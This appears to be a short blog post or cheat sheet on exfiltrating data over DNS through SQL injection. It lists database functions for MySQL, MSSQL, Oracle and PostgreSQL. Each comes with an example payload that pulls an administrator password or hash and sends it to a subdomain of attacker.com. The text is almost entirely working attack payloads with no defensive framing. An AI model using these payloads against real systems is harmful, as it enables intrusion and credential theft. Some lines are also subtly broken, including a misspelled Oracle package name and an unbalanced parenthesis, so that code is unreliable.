---
title: DNS exfiltration with SQL Injection
date: 2016-06-14 02:58:57
tags: DNS
---

#### MySQL

```
LOAD_FILE('<filepath>')   # reads the file content and returns it as a string
```
> example

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.attacker.com\\foobar'));
```
<!--more-->
#### Microsoft SQL Server

> master..xp_dirtree

```
EXEC master..xp_dirtree 'C:\Windows';
```
> master..xp_fileexist

```
EXEC master..xp_fileexist 'C:\boot.init';
```
> master..xp_subdirs

```
EXEC master..xp_subdirs 'C:\Windows';
```
> example

```
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.attacker.com';
EXEC('master..xp_dirtree "\\'+@host+'\c$"');
```

#### Oracle

> UTL_INADDR.GET_HOST_ADDRESS('<host>')     #to get the IP address of host test.example.com

```
SELECT UTL_INADDR.GET_HOST_ADDRESS('test.example.com');
```
> UTL_HTTP.REQUEST('<url>')     # to get the first 2000 bytes of data from a page

```
SELECT UTL_HTTP.REQUEST('http://test.example.com/index.php') FROM DUAL;
```

> HTTPURITYPE('<url>').GETCLOB      # to start content retrieval from a page

```
SELECT HTTPURITYPE('http://test.example.com/index.php').GETCLOB FROM DUAL;
```
> DBMS_LDAP.INIT(('<host>',<port>)      # to initialize a connection with the host

```
SELECT DBMS_LDAP.INIT(('test.example.com',80) FROM DUAL;
```
> example

```
SELECT DBMS_LADP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS') ||'.attacker.com',80) FROM DUAL;
```

#### PostgreSQL

```
COPY <table>(<column>,...) FROM '<path>'  # to copy the content from a file
```

> example

```
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()
RETURNS VOID AS $$
DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;
BEGIN
    SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE username='postgres');
    exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.attacker.com\\\\foobar.txt\'';
    EXECUTE exec_cmd;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT temp_function();
```
